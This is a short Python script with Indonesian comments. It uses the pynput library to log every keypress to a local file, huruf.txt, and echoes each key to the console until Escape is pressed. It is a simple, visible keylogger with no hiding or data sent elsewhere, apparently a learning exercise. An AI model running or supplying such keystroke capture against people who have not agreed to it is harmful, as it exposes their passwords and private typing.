from pynput.keyboard import Key, Listener

def masuk(new_input):
    # Membaca isi file huruf.txt jika sudah ada
    try:
        with open("huruf.txt", "r") as file:
            existing_content = file.read()
    except FileNotFoundError:
        existing_content = ""

    # Meminta masukan dari pengguna

    # Menggabungkan masukan baru dengan yang sudah ada (dipisahkan dengan baris baru)
    combined_content = existing_content + "\n" + new_input

    # Menyimpan isi terbaru ke dalam file huruf.txt
    with open("huruf.txt", "w") as file:
        file.write(combined_content)



def on_press(key):
    try:
        print(f'{key.char}')
        masuk(str(key))
    except AttributeError:
        # Jika bukan karakter yang dapat dicetak (misalnya, tombol spasi atau panah), cetak namanya.
        print(f'{key}')
        masuk(str(key))

def on_release(key):
    if key == Key.esc:
        # Jika tombol Escape ditekan, keluar dari program.
        return False

# Membuat objek Listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()